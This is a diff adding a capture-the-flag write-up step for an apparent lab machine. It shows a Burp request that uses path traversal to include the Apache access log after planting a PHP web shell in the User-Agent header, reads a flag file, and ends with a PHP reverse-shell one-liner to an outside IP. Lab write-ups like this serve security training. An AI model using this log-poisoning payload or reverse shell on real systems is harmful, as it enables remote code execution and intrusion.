@@ -53,3 +53,27 @@ A lot of files, we filter the errors one.
 
 Well. we can access the apache2 log.
 ![apache2 log](img/apache2.log.png)
+
+- Flag1
+```burp
+GET /?view=dog../../../../../../var/log/apache2/access.log&cmd=cat%20flag.php&ext= HTTP/1.1
+
+Host: 10.10.191.127
+
+User-Agent: <?php system($_GET['cmd']); ?>
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Referer: http://10.10.191.127/
+
+Upgrade-Insecure-Requests: 1
+```
+
+
+php -r '$sock=fsockopen("10.17.7.26", 1234);exec("/bin/bash -i <&3 >&3 2>&3");'
